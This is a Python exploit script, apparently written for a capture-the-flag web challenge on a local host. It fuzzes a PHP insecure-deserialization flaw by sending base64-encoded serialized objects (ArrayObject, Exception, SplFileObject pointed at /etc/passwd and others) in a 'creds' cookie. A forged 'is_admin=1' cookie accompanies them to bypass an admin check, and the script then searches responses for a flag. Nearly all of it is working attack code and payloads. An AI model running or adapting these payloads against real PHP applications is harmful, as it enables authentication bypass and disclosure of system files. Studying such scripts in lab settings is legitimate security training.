import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# Test various PHP built-in class payloads
payloads = {}

# 1. stdClass - basic object
payloads['stdClass'] = 'O:8:"stdClass":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'

# 2. ArrayObject - implements ArrayAccess, can be used as array (MOST PROMISING)
# ArrayObject can be treated as array because it implements ArrayAccess interface
payloads['ArrayObject'] = 'O:11:"ArrayObject":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'

# 3. Exception - has __toString magic method
# Exception properties are protected, need proper format with \x00*\x00 prefix
payloads['Exception'] = 'O:9:"Exception":7:{s:17:"\x00*\x00message";s:12:"test message";s:7:"\x00*\x00string";s:0:"";s:7:"\x00*\x00code";i:0;s:7:"\x00*\x00file";s:0:"";s:7:"\x00*\x00line";i:0;s:16:"\x00Exception\x00trace";a:0:{}s:20:"\x00Exception\x00previous";N;}'

# 4. Error class (PHP 7+)
payloads['Error'] = 'O:5:"Error":7:{s:17:"\x00*\x00message";s:12:"test message";s:7:"\x00*\x00string";s:0:"";s:7:"\x00*\x00code";i:0;s:7:"\x00*\x00file";s:0:"";s:7:"\x00*\x00line";i:0;s:11:"\x00Error\x00trace";a:0:{}s:15:"\x00Error\x00previous";N;}'

# 5. SplFileObject - for file operations, __toString reads file
payloads['SplFileObject'] = 'O:13:"SplFileObject":1:{s:8:"filename";s:11:"/etc/passwd";}'

# 6. SimpleXMLElement - for XXE/file operations
payloads['SimpleXMLElement'] = 'O:16:"SimpleXMLElement":1:{s:3:"xml";s:50:"<?xml version=\"1.0\"?><root>test</root>";}'

# 7. ArrayObject with different property structure
# Try with the storage member (ArrayObject stores data internally)
payloads['ArrayObject_storage'] = 'O:11:"ArrayObject":1:{s:18:"\x00*\x00storage";a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}}'

# 8. Try ArrayIterator (also implements ArrayAccess)
payloads['ArrayIterator'] = 'O:13:"ArrayIterator":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'

# Get baseline response with normal array
baseline_serialized = 'a:2:{s:8:"username";s:5:"Burns";s:8:"password";s:5:"Burns";}'
baseline_b64 = base64.b64encode(baseline_serialized.encode()).decode()

print("[*] Getting baseline response with normal array...\n")
headers = {'Cookie': f'creds={baseline_b64}; is_admin=1'}
resp = requests.get(base_url, headers=headers)
baseline_length = len(resp.content)
print(f"[+] Baseline array payload")
print(f"    Status: {resp.status_code}")
print(f"    Length: {len(resp.content)}B")
print(f"    Response preview: {resp.text[:500]}")

# Check for admin content
if "you are not the admin" in resp.text:
    print(f"    [!] Still shows rejection message")
if "FLAG" in resp.text or "flag" in resp.text.lower():
    print(f"    [!] POSSIBLE FLAG DETECTED!")

print("\n" + "="*80 + "\n")

# Test each payload
for name, payload in payloads.items():
    print(f"[*] Testing {name}...")
    
    # Base64 encode
    payload_b64 = base64.b64encode(payload.encode()).decode()
    
    # Send request with is_admin=1 cookie to bypass initial check
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    
    try:
        resp = requests.get(base_url, headers=headers, timeout=5)
        
        print(f"    Payload: {payload[:80]}...")
        print(f"    Status: {resp.status_code}")
        print(f"    Length: {len(resp.content)}B (baseline: {baseline_length}B, diff: {len(resp.content) - baseline_length:+d}B)")
        
        # Check for errors
        if "Fatal error" in resp.text or "Warning" in resp.text or "Error" in resp.text:
            # Extract error message
            error_match = re.search(r'(Fatal error.*?)(?:<|$)', resp.text, re.DOTALL)
            if error_match:
                print(f"    [!] ERROR: {error_match.group(1)[:200]}")
        
        # Check for __PHP_Incomplete_Class
        if "__PHP_Incomplete_Class" in resp.text:
            print(f"    [!] Class not recognized - __PHP_Incomplete_Class error")
        
        # Check for successful class instantiation
        if "Fatal error" not in resp.text and "__PHP_Incomplete_Class" not in resp.text:
            print(f"    [+] NO ERROR - Class may be recognized!")
        
        # Check for admin bypass
        if "you are not the admin" not in resp.text:
            print(f"    [+] ADMIN CHECK BYPASSED!")
        
        # Check for flag
        if "FLAG" in resp.text or "flag" in resp.text.lower():
            print(f"    [!!!] POSSIBLE FLAG DETECTED!")
            # Try to extract flag
            flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] FLAG: {flag_match.group(1)}")
        
        # Print response preview for interesting cases
        if len(resp.content) != baseline_length or "Fatal error" in resp.text:
            print(f"    Response preview: {resp.text[:300]}")
        
    except Exception as e:
        print(f"    [!] Exception: {e}")
    
    print()

print("="*80)
print("\n[*] Testing additional ArrayObject variants...\n")

# More ArrayObject variants with proper storage structure
arrayobject_variants = [
    # Variant 1: Direct property access (public properties)
    ('ArrayObject_public', 'O:11:"ArrayObject":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'),
    
    # Variant 2: Protected storage property
    ('ArrayObject_protected', 'O:11:"ArrayObject":1:{s:18:"\x00*\x00storage";a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}}'),
    
    # Variant 3: Try with isAdmin field
    ('ArrayObject_isAdmin', 'O:11:"ArrayObject":1:{s:18:"\x00*\x00storage";a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:7:"isAdmin";b:1;}}'),
    
    # Variant 4: Try with role field
    ('ArrayObject_role', 'O:11:"ArrayObject":1:{s:18:"\x00*\x00storage";a:3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:4:"role";s:5:"admin";}}'),
]

for name, payload in arrayobject_variants:
    print(f"[*] Testing {name}...")
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    
    try:
        resp = requests.get(base_url, headers=headers, timeout=5)
        print(f"    Status: {resp.status_code} | Length: {len(resp.content)}B (diff: {len(resp.content) - baseline_length:+d}B)")
        
        if "Fatal error" in resp.text:
            error_match = re.search(r'(Fatal error.*?)(?:<|$)', resp.text, re.DOTALL)
            if error_match:
                print(f"    [!] ERROR: {error_match.group(1)[:200]}")
        elif "__PHP_Incomplete_Class" in resp.text:
            print(f"    [!] Class not recognized")
        else:
            print(f"    [+] NO ERROR - Class recognized!")
        
        if "you are not the admin" not in resp.text:
            print(f"    [+] ADMIN CHECK BYPASSED!")
        
        if "FLAG" in resp.text:
            flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] FLAG: {flag_match.group(1)}")
        
    except Exception as e:
        print(f"    [!] Exception: {e}")
    
    print()

